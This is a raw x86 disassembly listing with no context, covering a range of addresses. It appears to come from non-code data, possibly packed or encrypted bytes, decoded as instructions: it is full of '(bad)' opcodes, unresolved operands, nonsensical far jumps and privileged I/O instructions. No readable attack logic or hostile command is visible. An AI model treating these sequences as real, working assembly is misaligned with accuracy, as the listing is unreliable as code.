  4183b9:	and    DWORD PTR es:[ebp-0x20],esi
  4183bd:	or     eax,0xb00a3be1
  4183c2:	test   BYTE PTR [ebx+0x5bf0ab4e],bl
  4183c8:	adc    al,0xf5
  4183ca:	xor    BYTE PTR [edx+ebp*2+0x7a],bl
  4183ce:	fwait
  4183cf:	stos   DWORD PTR es:[edi],eax
  4183d0:	xchg   ebx,eax
  4183d1:	imul   esi,DWORD PTR ds:0x58cbdf5c,0x79b12437
  4183db:	pushf  
  4183dc:	(bad)  
  4183dd:	push   ds
  4183de:	dec    esp
  4183df:	dec    ebp
  4183e0:	sbb    eax,0x57bb7932
  4183e5:	(bad)  
  4183e7:	mov    DWORD PTR [ebp+0x6079bef5],esi
  4183ed:	stos   BYTE PTR es:[edi],al
  4183ee:	mov    ds:0xf66bb786,al
  4183f3:	fcom   st(7)
  4183f5:	test   eax,0xa3ce04a1
  4183fa:	repz jl 0x418404
  4183fd:	jg     0x4183e7
  4183ff:	call   0xca463d58
  418404:	fwait
  418405:	pusha  
  418406:	xchg   ebp,eax
  418407:	inc    ebx
  418408:	adc    dh,bh
  41840a:	aam    0x9e
  41840c:	into   
  41840d:	adc    DWORD PTR [ecx-0x50ff2c32],0x5ac064e3
  418417:	ss jg  0x4183eb
  41841a:	or     bl,BYTE PTR [ecx-0x3429df6d]
  418420:	or     esp,DWORD PTR [ecx+0x29]
  418423:	jbe    0x4183fe
  418425:	dec    edx
  418426:	imul   DWORD PTR [ecx+0x2a]
  418429:	dec    esi
  41842a:	mov    ebx,edi
  41842c:	xor    DWORD PTR [edx],0x7649955
  418432:	fidivr DWORD PTR [ebx]
  418434:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418435:	gs loope 0x418463
  418438:	scas   al,BYTE PTR es:[di]
  41843a:	ror    esp,0x20
  41843d:	or     al,0x4a
  41843f:	push   ecx
  418440:	add    ecx,DWORD PTR [ecx+0x31]
  418443:	sar    DWORD PTR [edx+ecx*1],0x61
  418447:	mov    edx,0xbec41c3c
  41844c:	push   edx
  41844d:	inc    ebp
  41844e:	inc    esi
  41844f:	pop    edx
  418450:	xchg   ecx,eax
  418451:	add    DWORD PTR [eax+0x0],0x11
  418455:	lods   al,BYTE PTR ds:[esi]
  418456:	into   
  418457:	push   ds
  418458:	xchg   ebx,eax
  418459:	imul   esi,eax,0xffffffcb
  41845c:	push   ebx
  41845d:	ret    
  41845e:	mov    esp,DWORD PTR [ebx+esi*2-0x118f081b]
  418465:	out    dx,al
  418466:	add    eax,0x224276d6
  41846b:	daa    
  41846c:	mov    esi,0x65637bde
  418471:	xchg   esp,eax
  418472:	push   eax
  418473:	retf   0xe7c9
  418476:	cli    
  418477:	xchg   ebx,eax
  418478:	adc    eax,0x3150d976
  41847d:	push   0xffffffb1
  41847f:	mov    ebx,0xe4303c52
  418484:	mov    esi,esp
  418486:	sub    eax,0xec480192
  41848b:	mov    eax,ds:0x3a5fff39
  418490:	test   al,0x35
  418492:	(bad)  
  418493:	stc    
  418494:	iret   
  418495:	mov    DWORD PTR [edi+esi*1+0x57],esp
  418499:	(bad)  
  41849a:	repz loop 0x41846d
  41849d:	dec    ecx
  41849e:	pop    ds
  41849f:	xchg   edi,eax
  4184a0:	mov    bh,0x38
  4184a2:	inc    ebx
  4184a3:	adc    eax,edx
  4184a5:	sbb    eax,0x6c304969
  4184aa:	test   al,0x45
  4184ac:	dec    ecx
  4184ad:	push   esi
  4184ae:	or     DWORD PTR [esi],0x1dbb539e
  4184b4:	mov    DWORD PTR ds:[edx+0x51],edi
  4184b8:	pop    es
  4184b9:	push   edi
  4184ba:	inc    ebx
  4184bb:	outs   dx,DWORD PTR ds:[esi]
  4184bc:	jne    0x41850e
  4184be:	retf   0x4dd3
  4184c1:	and    edi,DWORD PTR [edx-0x26]
  4184c4:	add    eax,0xc8c13735
  4184c9:	jne    0x41850e
  4184cb:	xor    eax,DWORD PTR [edi]
  4184cd:	loope  0x418509
  4184cf:	add    DWORD PTR [edi+0x52],0x61
  4184d3:	in     eax,dx
  4184d4:	bound  esi,QWORD PTR [esi-0x3f]
  4184d7:	imul   esi,DWORD PTR [edx],0x39e7f83
  4184dd:	ins    BYTE PTR es:[edi],dx
  4184de:	les    eax,FWORD PTR [edi]
  4184e0:	mov    ch,0x72
  4184e2:	and    ah,0x81
  4184e5:	ja     0x41853c
  4184e7:	cmp    BYTE PTR [edi+0x4b3a6037],ch
  4184ed:	jge    0x4184b9
  4184ef:	jmp    0x8fa1ef86
  4184f4:	jecxz  0x41851b
  4184f6:	in     eax,0xf3
  4184f8:	xor    DWORD PTR [esp+edi*8-0x70],ebx
  4184fc:	xchg   edi,eax
  4184fd:	xor    BYTE PTR [eax+edx*8],dh
  418500:	popf   
  418501:	push   ecx
  418502:	inc    esi
  418503:	mov    cl,0xb0
  418505:	sbb    eax,0xfcbe520b
  41850a:	sbb    bh,ch
  41850c:	sub    al,0x7a
  41850e:	ror    DWORD PTR [esi-0x71],0xe2
  418512:	xchg   edi,eax
  418513:	pop    ds
  418514:	mov    WORD PTR [esi+0x10],cs
  418517:	jae    0x41857d
  418519:	bound  edx,QWORD PTR [esi]
  41851b:	loope  0x418520
  41851d:	or     esi,esi
  41851f:	jmp    0x3858:0x857e64a6
  418526:	ins    BYTE PTR es:[edi],dx
  418527:	call   0x6d29c194
  41852c:	and    esp,ebx
  41852e:	jae    0x41856d
  418530:	mov    esi,0x4c3e65b9
  418535:	ins    DWORD PTR es:[edi],dx
  418536:	pop    es
  418537:	dec    esp
  418538:	jne    0x4185a0
  41853a:	retf   
  41853b:	fnstsw WORD PTR [edx+0x47f0de39]
  418541:	repz cdq 
  418543:	ret    0xdd26
  418546:	adc    eax,DWORD PTR [esi-0x56]
  418549:	mov    ah,0x79
  41854b:	xor    DWORD PTR ds:0xcd8544b9,0x87bfa91a
  418555:	jmp    0x494d206f
  41855a:	cli    
  41855b:	call   0x85635e75
  418560:	dec    ebp
  418561:	loopne 0x41858a
  418563:	out    0x28,al
  418565:	pop    ebx
  418566:	cmp    BYTE PTR [edi+0x6ac98b37],ch
  41856c:	ret    
  41856d:	dec    esp
  41856e:	fcom   st(2)
  418570:	stos   DWORD PTR es:[edi],eax
  418571:	div    DWORD PTR [ecx]
  418573:	fistp  WORD PTR [edi+ecx*1-0x5f]
  418577:	pop    esi
  418578:	mov    bl,0xfa
  41857a:	mov    edi,?
  41857c:	ror    DWORD PTR ds:[ebp-0x41b4bd4d],1
  418583:	sbb    DWORD PTR ds:0x4073947d,edx
  418589:	jo     0x41856e
  41858b:	sbb    ecx,ebx
  41858d:	adc    al,BYTE PTR [edx]
  41858f:	cmc    
  418590:	mov    ecx,0xa483f3de
  418595:	xchg   ebp,eax
  418596:	in     al,dx
  418597:	pop    ecx
  418598:	comiss xmm6,DWORD PTR [ebx+0x542d9e17]
  41859f:	or     al,0x1a
  4185a1:	inc    esp
  4185a2:	inc    ecx
  4185a3:	daa    
  4185a4:	sub    eax,0x694e0fe6
  4185a9:	or     BYTE PTR [ebx-0xd],al
  4185ac:	sbb    esp,DWORD PTR [edx+0x17]
  4185af:	mov    ecx,0xda7e93f
  4185b4:	push   eax
  4185b5:	scas   eax,DWORD PTR es:[edi]
  4185b6:	inc    ecx
  4185b7:	mov    BYTE PTR [edi],al
  4185b9:	jg     0x4185fc
  4185bb:	shl    DWORD PTR [eax],0x69
  4185be:	mov    edi,0x35809050
  4185c3:	push   0xffffffb2
  4185c5:	dec    ecx
  4185c6:	xor    eax,DWORD PTR [ecx-0x4d]
  4185c9:	and    BYTE PTR ds:0x49694008,bl
  4185cf:	inc    edx
  4185d0:	mov    edx,ebx
  4185d2:	lods   al,BYTE PTR ds:[esi]
  4185d3:	and    ah,bl
  4185d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4185d6:	xlat   BYTE PTR ds:[ebx]
  4185d7:	dec    ebx
  4185d8:	dec    ecx
  4185d9:	adc    esi,DWORD PTR [edi+ebp*4]
  4185dc:	enter  0x31e6,0x4b
  4185e0:	ret    0x31f0
  4185e3:	popa   
  4185e4:	sub    eax,eax
  4185e6:	(bad)  
  4185e7:	(bad)  
  4185e8:	cli    
  4185e9:	cmp    DWORD PTR [ebp-0x24],ebx
  4185ec:	adc    ebx,eax
  4185ee:	test   BYTE PTR [ecx-0x232c09f],cl
  4185f4:	aam    0xf2
  4185f6:	call   0x696ccc5b
  4185fb:	cmp    ah,BYTE PTR [ebx+0xa9e00f7]
  418601:	inc    esi
  418602:	popa   
  418603:	or     DWORD PTR [ebx+0x7214dd30],ebx
  418609:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41860a:	cli    
  41860b:	jnp    0x41865a
  41860d:	sbb    bh,BYTE PTR [ecx-0x91409b2]
  418613:	cmp    ch,BYTE PTR [edx+0x162464c6]
  418619:	mov    eax,ds:0x4f3d3fe2
  41861e:	cmp    eax,0x9ba5a2e0
  418623:	stos   DWORD PTR es:[edi],eax
  418624:	jg     0x418643
  418626:	aaa    
  418627:	(bad)  
  418629:	popf   
  41862a:	arpl   WORD PTR [edi+edx*2-0x6b],bx
  41862e:	xlat   BYTE PTR ds:[ebx]
  41862f:	adc    BYTE PTR [esi],0x5d
  418632:	mov    BYTE PTR [eax],dh
  418634:	sub    al,0xba
  418636:	inc    ebx
  418637:	inc    esi
  418638:	sub    DWORD PTR [ecx],eax
  41863a:	add    esp,DWORD PTR [edi]
  41863c:	push   edi
  41863d:	add    ah,BYTE PTR [ecx-0x20846323]
  418643:	inc    edi
  418644:	inc    eax
  418645:	mov    edi,DWORD PTR [ebx-0x69d210a2]
  41864b:	sahf   
  41864c:	inc    ebp
  41864d:	sub    bh,BYTE PTR [eax+ebx*8+0x3e9730d6]
  418654:	mov    ds:0x31f4fdf9,eax
  418659:	fmul   DWORD PTR [edi-0x47]
  41865c:	popa   
  41865d:	xor    esi,edi
  41865f:	cmp    eax,DWORD PTR [ecx+0x1c]
  418662:	xor    al,0x5c
  418664:	mov    bh,0xc
  418666:	pop    ebp
  418667:	inc    ebx
  418668:	sbb    DWORD PTR [edx+esi*8+0x9],edi
  41866c:	pop    esi
  41866d:	dec    ebx
  41866e:	outs   dx,DWORD PTR ds:[esi]
  41866f:	inc    esp
  418670:	sbb    ebp,DWORD PTR [esp+eiz*8-0x50]
  418674:	pushf  
  418675:	push   esi
  418676:	in     eax,0x2e
  418678:	aam    0x78
  41867a:	push   es
  41867b:	adc    BYTE PTR [eax+eiz*8],bh
  41867e:	lods   al,BYTE PTR ds:[esi]
  41867f:	iret   
  418680:	shl    DWORD PTR [ebx-0x11090783],cl
  418686:	mov    ds:0xebfe70de,eax
  41868b:	inc    esp
  41868c:	adc    BYTE PTR [ecx+0x4b],bh
  41868f:	mov    ebx,0x599b2545
  418694:	mov    dl,0x3
  418696:	popa   
  418697:	es repz sbb eax,0xb156349e
  41869e:	nop
  41869f:	push   esi
  4186a0:	pop    edi
  4186a1:	mov    al,0x3e
  4186a3:	cmc    
  4186a4:	shl    DWORD PTR [esi],1
  4186a6:	cmp    DWORD PTR [edx-0x5e],esp
  4186a9:	rol    esp,1
  4186ab:	pop    edi
  4186ac:	mov    edx,0xa32f5b86
  4186b1:	inc    esp
  4186b2:	leave  
  4186b3:	jns    0x418679
  4186b5:	rcr    DWORD PTR [eax-0x1b],cl
  4186b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4186b9:	mov    ss,WORD PTR [esp+eax*4-0x676d8379]
  4186c0:	fild   DWORD PTR [eax]
  4186c2:	jl     0x41866c
  4186c4:	into   
  4186c5:	mov    DWORD PTR [edx],edi
  4186c7:	mov    al,0xd6
  4186c9:	(bad)  
  4186ca:	jl     0x418668
  4186cc:	(bad)  
  4186cd:	aam    0x9b
  4186cf:	xchg   ecx,eax
  4186d0:	jns    0x4186d6
  4186d2:	adc    BYTE PTR [ebx],bl
  4186d4:	repz mov WORD PTR [ecx],ss
  4186d7:	sbb    BYTE PTR [ebx-0x69],bh
  4186da:	adc    ch,BYTE PTR [edx+0x11]
  4186dd:	das    
  4186de:	test   al,0x5c
  4186e0:	and    BYTE PTR [edx-0x48a333bb],al
  4186e6:	mov    eax,0x5c1aa747
  4186eb:	shl    BYTE PTR [edi+edx*2-0x12],1
  4186ef:	(bad)  
  4186f0:	jge    0x418732
  4186f2:	pop    ds
  4186f3:	push   0xf
  4186f5:	scas   al,BYTE PTR es:[edi]
  4186f6:	mov    esi,0xe1891335
  4186fb:	cmc    
  4186fc:	outs   dx,BYTE PTR ds:[esi]
  4186fd:	mov    eax,ds:0x71719339
  418702:	mov    BYTE PTR [esi+0x46],ah
  418705:	or     eax,0xfc24e6c7
  41870a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41870b:	ffree  st(3)
  41870d:	mov    DWORD PTR [eax-0x7a],ebp
  418710:	fwait
  418711:	lods   al,BYTE PTR ds:[esi]
  418712:	cdq    
  418713:	adc    al,0x3b
  418715:	mov    ?,WORD PTR [ebx]
  418717:	sub    al,0xfd
  418719:	mov    eax,ds:0x547075a3
  41871e:	fmul   QWORD PTR [edx-0x2382c86]
  418724:	outs   dx,DWORD PTR ds:[esi]
  418725:	sub    ecx,DWORD PTR [eax-0x6d]
  418728:	sti    
  418729:	call   0x73a661a7
  41872e:	stos   DWORD PTR es:[edi],eax
  41872f:	inc    esi
  418730:	push   edx
  418731:	(bad)  
  418733:	and    eax,0xec9d6f63
  418738:	clc    
  418739:	xor    BYTE PTR [edx],bl
  41873b:	pop    esp
  41873c:	cli    
  41873d:	mov    ecx,0x9fbd4625
  418742:	inc    eax
  418743:	jno    0x4186ea
  418745:	leave  
  418746:	xchg   ebp,eax
  418747:	inc    ebx
  418748:	ss jb  0x4186ee
  41874b:	leave  
  41874c:	aad    0xf1
  41874e:	xor    eax,0x9a16d3b2
  418753:	dec    edi
  418754:	stos   BYTE PTR es:[edi],al
  418755:	pop    ebx
  418756:	fs inc eax
  418758:	add    al,0x7c
  41875a:	retf   0x3602
  41875d:	add    BYTE PTR [ecx-0x73],0x4e
  418761:	jbe    0x4186f9
  418763:	adc    edi,DWORD PTR [ebx+0x14f83256]
  418769:	xlat   BYTE PTR ds:[ebx]
  41876a:	jbe    0x41877a
  41876c:	mov    esp,0xa50b9518
  418771:	loope  0x418705
  418773:	jge    0x418777
  418775:	push   0xf4c2b640
  41877a:	mov    al,0xbb
  41877c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41877d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41877e:	imul   edx,ebp,0xab390985
  418784:	xchg   esp,eax
  418785:	push   cs
  418786:	or     edx,ebp
  418788:	retf   0xd57e
  41878b:	sbb    al,0x58
  41878d:	dec    eax
  41878e:	int3   
  41878f:	dec    esi
  418790:	mov    eax,ds:0x9e9e3ce5
  418795:	mov    edx,DWORD PTR [esi-0x69]
  418798:	xchg   esi,eax
  418799:	clc    
  41879a:	lea    esi,[ebx]
  41879c:	clc    
  41879d:	inc    edi
  41879e:	stos   DWORD PTR es:[edi],eax
  41879f:	aaa    
  4187a0:	fst    QWORD PTR [esi-0x54aeec57]
  4187a6:	js     0x41874f
  4187a8:	jmp    0x71a7:0xac5c1ab9
  4187af:	inc    ebx
  4187b0:	or     ah,BYTE PTR [ebp-0x3a]
  4187b3:	in     al,dx
  4187b4:	adc    al,BYTE PTR [edi-0x3000b68d]
  4187ba:	mov    eax,0xc38d9e26
  4187bf:	loopne 0x4187ba
  4187c1:	mov    eax,ds:0xc75671c4
  4187c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4187c7:	mov    ebp,0x818eb0b5
  4187cc:	lods   al,BYTE PTR ds:[esi]
  4187cd:	cmp    ah,ah
  4187cf:	sub    al,0x45
  4187d1:	mov    DWORD PTR [ecx],ebp
  4187d3:	sti    
  4187d4:	bound  ecx,QWORD PTR [esi]
  4187d6:	bound  eax,QWORD PTR [edi+0x63]
  4187d9:	rol    BYTE PTR [edx+eax*2-0x34ca3e2],1
  4187e0:	pop    edi
  4187e1:	scas   eax,DWORD PTR es:[edi]
  4187e2:	mov    dl,0xac
  4187e4:	std    
  4187e5:	mov    al,ds:0x9e06f1a
  4187ea:	pop    esp
  4187eb:	repnz mov ebx,0x24dd943b
  4187f1:	or     dl,BYTE PTR [eax]
  4187f3:	fnstsw WORD PTR [ecx+eiz*1-0x36]
  4187f7:	jp     0x418878
  4187f9:	stos   BYTE PTR es:[edi],al
  4187fa:	fcom   DWORD PTR [ebp+0xf]
  4187fd:	pop    esp
  4187fe:	mov    dh,0xbe
  418800:	sub    eax,0x9fe65dbb
  418805:	fstp   st(4)
  418807:	psrlq  mm4,0xf0
  41880b:	aaa    
  41880c:	imul   esp,DWORD PTR [ecx-0x1cb86429],0x61
  418813:	sahf   
  418814:	mov    ecx,0x88252d6
  418819:	ss stc 
  41881b:	fisub  DWORD PTR [ecx+0x2a]
  41881e:	dec    edi
  41881f:	fwait
  418820:	lock and eax,0x3d75b98a
  418826:	repz or DWORD PTR [edx-0x4d],esi
  41882a:	repnz and BYTE PTR [edx],cl
  41882d:	test   DWORD PTR [edi+edx*8-0x48],ebp
  418831:	ins    BYTE PTR es:[edi],dx
  418832:	(bad)  
  418833:	jno    0x418838
  418835:	fistp  QWORD PTR [edi]
  418837:	bound  esp,QWORD PTR [edi+0x1d532f9e]
  41883d:	lods   eax,DWORD PTR ds:[esi]
  41883e:	lea    ecx,[ebx+0x6fa779f6]
  418844:	mov    ?,WORD PTR [ecx+0x5d8e37cf]
  41884a:	xor    dh,0x35
  41884d:	push   ds
  41884e:	sbb    cl,BYTE PTR [esp+edx*4-0x1542d767]
  418855:	dec    edi
  418856:	mov    al,0xf1
  418858:	fld    DWORD PTR [edx+ebp*2+0x79e80812]
  41885f:	loopne 0x418800
  418861:	unpcklps xmm4,XMMWORD PTR [ecx-0x71]
  418865:	push   eax
  418866:	lds    esi,FWORD PTR [eax-0x2ed2c8ad]
  41886c:	scas   al,BYTE PTR es:[edi]
  41886d:	mov    cl,0xc0
  41886f:	aad    0x41
  418871:	jnp    0x4188a7
  418873:	mov    bl,BYTE PTR [esp+edx*8]
  418876:	mov    esi,0xd784ed0
  41887b:	stc    
  41887c:	mov    ebx,0xec4385ad
  418881:	ins    DWORD PTR es:[edi],dx
  418882:	mov    bh,BYTE PTR [esi-0x3ac7acca]
  418888:	inc    esi
  418889:	push   ds
  41888a:	lds    esp,FWORD PTR [eax+0x5940f2bb]
  418890:	jae    0x4188cd
  418892:	std    
  418893:	fldcw  WORD PTR [ebp+0x5cc4a58b]
  418899:	jnp    0x41887a
  41889b:	lods   eax,DWORD PTR fs:[esi]
  41889d:	fs aad 0xe7
  4188a0:	aam    0x0
  4188a2:	sub    BYTE PTR [eax],0x51
  4188a5:	les    esp,FWORD PTR [ebx+esi*2+0x1f]
  4188a9:	jnp    0x4188d5
  4188ab:	inc    eax
  4188ac:	icebp  
  4188ad:	or     al,0x9f
  4188af:	mov    eax,0x7d429759
  4188b4:	and    DWORD PTR [ebx],ebx
  4188b6:	push   ds
  4188b7:	sbb    bh,BYTE PTR [edi-0x13]
  4188ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4188bb:	mov    dl,0xeb
  4188bd:	mov    eax,DWORD PTR [esi]
  4188bf:	sbb    DWORD PTR [ebp-0x10],ecx
  4188c2:	fwait
  4188c3:	or     eax,0xc1311989
  4188c8:	inc    ebp
  4188c9:	add    eax,0x6fb18f5d
  4188ce:	push   ss
  4188cf:	sahf   
  4188d0:	(bad)
  4188d3:	ficomp DWORD PTR [esp+esi*2+0x30]
  4188d7:	or     cl,ch
  4188d9:	stos   DWORD PTR es:[edi],eax
  4188da:	les    esp,FWORD PTR [eax+0x47]
  4188dd:	mov    bh,0xc2
  4188df:	xchg   BYTE PTR [edx+ecx*1],al
  4188e2:	jmp    0xc347:0x50e7d7a1
  4188e9:	popa   
  4188ea:	inc    ebp
  4188eb:	ret    0x17fd
  4188ee:	pop    esp
  4188ef:	outs   dx,DWORD PTR ds:[esi]
  4188f0:	xchg   edx,eax
  4188f1:	fiadd  DWORD PTR [esi-0x39]
  4188f4:	stc    
  4188f5:	mov    cl,al
  4188f7:	inc    esi
  4188f8:	mov    esp,0x456c3c04
  4188fd:	mov    WORD PTR [esi],cs
  4188ff:	je     0x418913
  418901:	lds    ebp,FWORD PTR [esp+ebx*8-0x64]
  418905:	push   ds
  418906:	sbb    eax,0x2bb47d14
  41890b:	add    BYTE PTR [esi+0x3ea17943],ch
  418911:	xor    DWORD PTR [edx+0x52f6a8bf],edi
  418917:	(bad)  
  418919:	fisttp DWORD PTR [eax-0x4c]
  41891c:	and    BYTE PTR [edx-0x13b94907],dh
  418922:	mov    bh,BYTE PTR [edi]
  418924:	push   es
  418925:	sbb    al,0x24
  418927:	into   
  418928:	pop    ebx
  418929:	bound  eax,QWORD PTR [ecx-0xf02b98e]
  41892f:	mov    BYTE PTR ds:0x27abc6f9,cl
  418935:	stos   DWORD PTR es:[edi],eax
  418936:	push   ds
  418937:	inc    ebp
  418938:	fisttp QWORD PTR [ebp-0x7ef4d976]
  41893e:	pop    eax
  41893f:	js     0x4189a5
  418941:	test   ebp,edx
  418943:	dec    eax
  418944:	clc    
  418945:	scas   eax,DWORD PTR es:[edi]
  418946:	std    
  418947:	jmp    0x41890e
  418949:	push   esi
  41894a:	or     al,ah
  41894c:	or     eax,0x3e6d1dd
  418951:	leave  
  418952:	fcmove st,st(7)
  418954:	(bad)  [edi-0x60]
  418957:	inc    ecx
  418958:	retf   
  418959:	bound  esp,QWORD PTR [edi-0x8]
  41895c:	fs mov al,0xee
  41895f:	in     al,0x24
  418961:	cwde   
  418962:	xchg   ecx,eax
  418963:	(bad)  
  418964:	pop    esp
  418965:	scas   eax,DWORD PTR es:[edi]
  418966:	and    DWORD PTR ds:0x273f3b7f,ebx
  41896c:	push   eax
  41896d:	in     eax,0x43
  41896f:	pushf  
  418970:	xor    bl,BYTE PTR [eax]
  418972:	pop    edx
  418973:	dec    ebp
  418974:	adc    ebx,DWORD PTR [esi-0x7f]
  418977:	add    eax,0xb1bd31a0
  41897c:	(bad)  
  41897d:	mov    ebp,0xfc99bc3f
  418982:	lea    ecx,[edx]
  418984:	xor    al,0xba
  418986:	and    ch,bh
  418988:	or     eax,0xfb86aaeb
  41898d:	repz out dx,eax
  41898f:	(bad)  
  418990:	out    0x6f,eax
  418992:	mov    ds:0xa380de4e,eax
  418997:	inc    esi
  418998:	sub    BYTE PTR [esi-0x56],bl
  41899b:	mov    dl,0x5a
  41899d:	sar    DWORD PTR [ebx+0x7c],0xdc
  4189a1:	cmp    al,0x74
  4189a3:	imul   edi,DWORD PTR [esi-0x31],0x45
  4189a7:	popf   
  4189a8:	adc    ah,BYTE PTR [ebx+0x12]
  4189ab:	data16 rcr BYTE PTR [ebx-0x2a],1
  4189af:	ins    BYTE PTR es:[edi],dx
  4189b0:	push   cs
  4189b1:	mov    BYTE PTR [edi+0x67],ah
  4189b4:	aad    0x8
  4189b6:	mov    edx,0xf6abb1ac
  4189bb:	pop    ebp
  4189bc:	jns    0x418982
  4189be:	xchg   BYTE PTR [esp+esi*4+0x2975abf8],bl
  4189c5:	iret   
  4189c6:	jg     0x418a00
  4189c8:	fist   WORD PTR [ebx-0x3f]
  4189cb:	std    
  4189cc:	addr16 push edx
  4189ce:	enter  0xd6da,0xfc
  4189d2:	rcl    BYTE PTR [ebx+ebx*2],0xde
  4189d6:	mov    bh,0x39
  4189d8:	int3   
  4189d9:	mov    ah,0xc
  4189db:	or     al,0xfa
  4189dd:	pop    edi
  4189de:	inc    edx
  4189df:	dec    DWORD PTR [ebx]
  4189e1:	jmp    0x75e1e87b
  4189e6:	or     al,0x78
  4189e8:	mov    cl,0x21
  4189ea:	lods   eax,DWORD PTR ds:[esi]
  4189eb:	jge    0x41898b
  4189ed:	xor    DWORD PTR [eax],ebp
  4189ef:	sub    eax,0xb821f760
  4189f4:	lods   al,BYTE PTR ds:[esi]
  4189f5:	mov    eax,ds:0xb86bb588
  4189fa:	mov    cl,0x51
  4189fc:	sub    BYTE PTR [ebp-0x2d],ch
  4189ff:	int    0x34
  418a01:	cmp    bl,BYTE PTR [ebx]
  418a03:	mov    ?,WORD PTR [edi+0x5446c8f4]
  418a09:	stos   BYTE PTR es:[edi],al
  418a0a:	rol    cl,1
  418a0c:	loopne 0x418998
  418a0e:	hlt    
  418a0f:	jne    0x418a71
  418a11:	or     BYTE PTR [edx+0x12],0x3d
  418a15:	mov    esp,0xc52d0a35
  418a1a:	imul   esp,DWORD PTR [esi+0x7c],0x3c
  418a1e:	jno    0x4189c9
  418a20:	mov    al,ds:0x485da685
  418a25:	add    BYTE PTR ds:0xf2e78a46,0xc9
  418a2c:	fwait
  418a2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a2e:	and    DWORD PTR [eax+esi*8+0x41955a43],ebx
  418a35:	mov    eax,ds:0xb85a056e
  418a3a:	push   ecx
  418a3b:	pop    edx
  418a3c:	or     DWORD PTR [edx-0x6e781a6b],ebp
  418a42:	data16 add al,0xf5
  418a45:	inc    ecx
  418a46:	pop    ebx
  418a47:	or     cl,cl
  418a49:	popa   
  418a4a:	lahf   
  418a4b:	inc    esi
  418a4c:	inc    esp
  418a4d:	ins    DWORD PTR es:[edi],dx
  418a4e:	retf   0x4141
  418a51:	and    al,0xc5
  418a53:	retw   0x54
  418a57:	ret    
  418a58:	imul   ebp,DWORD PTR [ebp+0x213228a1],0x20
  418a5f:	call   0xafdb9c31
  418a64:	cwde   
  418a65:	jge    0x4189eb
  418a67:	pop    es
  418a68:	mov    dh,0x9c
  418a6a:	lea    ecx,[esi]
  418a6c:	outs   dx,BYTE PTR ds:[esi]
  418a6d:	adc    BYTE PTR [esp+ebp*4+0x7b6387c4],al
  418a74:	adc    DWORD PTR [eax],ebx
  418a76:	int3   
  418a77:	adc    bl,BYTE PTR [eax-0x7c4faaee]
  418a7d:	leave  
  418a7e:	test   al,0x87
  418a80:	xchg   edi,eax
  418a81:	xchg   BYTE PTR [edx],bl
  418a83:	popf   
  418a84:	inc    ebp
  418a86:	sbb    al,0xcf
  418a88:	(bad)  
  418a89:	lods   al,BYTE PTR ds:[esi]
  418a8a:	mov    esi,DWORD PTR [ecx-0x51728f06]
  418a90:	gs cwde 
  418a92:	ret    
  418a93:	leave  
  418a94:	in     al,0xd1
  418a96:	push   es
  418a97:	loopne 0x418ab6
  418a99:	and    BYTE PTR [edx],dl
  418a9b:	xchg   BYTE PTR [edx+0x345fd261],dl
  418aa1:	jge    0x418a97
  418aa3:	popf   
  418aa4:	jmp    FWORD PTR [esi-0x48]
  418aa7:	add    dl,BYTE PTR [edi-0xd]
  418aaa:	push   esi
  418aab:	push   ss
  418aac:	daa    
  418aad:	mov    edx,0xa7aece96
  418ab2:	jg     0x418aa2
  418ab4:	inc    esi
  418ab5:	pop    es
  418ab6:	dec    ebx
  418ab7:	dec    ebp
  418ab8:	or     esp,DWORD PTR [ebx]
  418aba:	xchg   BYTE PTR [ecx*4-0x6f03388d],ch
  418ac1:	cwde   
  418ac2:	push   edi
  418ac3:	adc    al,0xc
  418ac5:	imul   esi,ecx,0x7ba7f972
  418acb:	cmp    al,0xcf
  418acd:	in     eax,dx
  418ace:	pop    ds
  418acf:	cmp    al,0x57
  418ad1:	mov    al,ds:0xe0addf0b
  418ad6:	scas   eax,DWORD PTR es:[edi]
  418ad7:	inc    esp
  418ad8:	scas   al,BYTE PTR es:[edi]
  418ad9:	ficomp WORD PTR [eax+0x4c4d3718]
  418adf:	imul   edx,DWORD PTR [esi],0xffffff9c
  418ae2:	jp     0x418b4b
  418ae4:	mov    es,WORD PTR [ecx-0x6c3dd857]
  418aea:	in     al,0xcb
  418aec:	sub    DWORD PTR [ebp+ebx*2+0xc],eax
  418af0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418af1:	mov    dl,0xc0
  418af3:	(bad)  
  418af4:	fs dec edi
  418af6:	(bad)  
  418af7:	lods   eax,DWORD PTR ds:[esi]
  418af8:	pop    eax
  418af9:	add    al,0x53
  418afb:	xlat   BYTE PTR ds:[ebx]
  418afc:	in     al,0x5f
  418afe:	jmp    0xd70f:0x987beef6
  418b05:	imul   edi,DWORD PTR [edx-0x34bdce75],0x4e
  418b0c:	sub    DWORD PTR [ecx+edi*1],0xfffffff5
  418b10:	addr16 mov esp,0xc6c72a9a
  418b16:	jl     0x418b0d
  418b18:	and    al,0xb5
  418b1a:	lahf   
  418b1b:	pop    esp
  418b1c:	or     edi,0x6
  418b1f:	js     0x418ad9
  418b21:	je     0x418adf
  418b23:	pop    ebp
  418b24:	dec    edx
  418b25:	adc    DWORD PTR [ecx+0x68],edi
  418b28:	adc    DWORD PTR [ecx-0x7b7d45bf],edi
  418b2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418b2f:	mov    ebx,0x1ad865c6
  418b34:	mov    DWORD PTR [ecx-0xe],ecx
  418b37:	loop   0x418b4d
  418b39:	fdiv   DWORD PTR [ecx-0x3bb6effc]
  418b3f:	pop    esp
  418b40:	sbb    al,0x48
  418b42:	adc    BYTE PTR [esi+0x3],0x7c
  418b46:	stc    
  418b47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b48:	lea    esp,[ebx+0x3d6dd0be]
  418b4e:	sti    
  418b4f:	pushf  
  418b50:	lock aas 
  418b52:	dec    edx
  418b53:	shr    ah,0x3
  418b56:	ret    0x4bed
  418b59:	jg     0x418af4
  418b5b:	dec    ebx
  418b5c:	jmp    0x6514f7c5
  418b61:	sub    dh,BYTE PTR [edx-0x66ac04f9]
